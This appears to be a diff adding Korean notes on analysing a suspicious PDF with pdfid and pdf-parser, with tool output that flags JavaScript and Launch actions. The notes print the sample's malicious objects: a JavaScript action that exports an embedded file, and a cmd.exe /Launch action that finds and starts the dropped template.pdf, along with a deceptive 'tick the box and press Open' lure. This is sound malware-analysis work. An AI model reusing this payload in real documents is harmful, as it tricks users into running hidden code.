@@ -1,0 +1,82 @@
+문서파일은 중요한 정보가 담긴 파일 일수 있기 때문에 
+되도록이면 직접 업로드를 하는 것 보다는 hash 값을 통해 체크하는 것을 추천 
+
+
+===  pdfid 활용 ===
+#/usr/share/pdfid# ./pdfid.py /var/www/html/test.pdf
+root@kali:/usr/share/pdfid# ./pdfid.py /var/www/html/test.pdf 
+PDFiD 0.2.1 /var/www/html/test.pdf
+ PDF Header: %PDF-1.0
+ obj                   12
+ endobj                12
+ stream                 2
+ endstream              2
+ xref                   2
+ trailer                2
+ startxref              2
+ /Page                  2
+ /Encrypt               0
+ /ObjStm                0
+ /JS                    1	     <-------
+ /JavaScript            1     <------
+ /AA                    1
+ /OpenAction            1
+ /AcroForm              0
+ /JBIG2Decode           0
+ /RichMedia             0
+ /Launch                1
+ /EmbeddedFile          0
+ /XFA                   0
+ /Colors > 2^24         0
+
+=== pdf-parser 활용 ====
+# pdf-parser --stats /var/www/html/test.pdf  
+Comment: 3
+XREF: 2
+Trailer: 2
+StartXref: 2
+Indirect object: 12
+  4: 4, 5, 6, 8
+ /Action 2: 9, 10    <---
+ /Catalog 2: 1, 1
+ /Filespec 1: 7
+ /Page 2: 3, 3
+ /Pages 1: 2
+
+# pdf-parser --search javascript --raw /var/www/html/test.pdf 
+obj 9 0
+ Type: /Action
+ Referencing: 
+<</S/JavaScript/JS(this.exportDataObject({ cName: "template", nLaunch: 0 });)/Type/Action>>
+
+  <<
+    /S /JavaScript
+    /JS (this.exportDataObject({ cName: "template", nLaunch: 0 });)
+    /Type /Action
+  >>
+
+# pdf-parser --object 10 --raw --filter /var/www/html/test.pdf 
+obj 10 0
+ Type: /Action
+ Referencing: 
+<</S/Launch/Type/Action/Win<</F(cmd.exe)/D(c:\\windows\\system32)/P(/Q /C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\template.pdf" (cd "My Documents"))&(if exist "Documents\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)
+
+To view the encrypted content please tick the "Do not show this message again" box and press Open.)>>>>
+
+  <<
+    /S /Launch
+    /Type /Action
+    /Win
+      <<
+        /F (cmd.exe)
+        /D '(c:\\\\windows\\\\system32)'
+        /P (
+        /Q '/C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\\\template.pdf" (cd "My Documents"))&(if exist "Documents\\\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)\n\n\n\n\n\n\n\n\n\nTo view the encrypted content please tick the "Do not show this message again" box and press Open.)'
+      >>
+  >>
+
+<</S/Launch/Type/Action/Win<</F(cmd.exe)/D(c:\\windows\\system32)/P(/Q /C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\template.pdf" (cd "My Documents"))&(if exist "Documents\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)
+
+To view the encrypted content please tick the "Do not show this message again" box and press Open.)>>>>
+
+
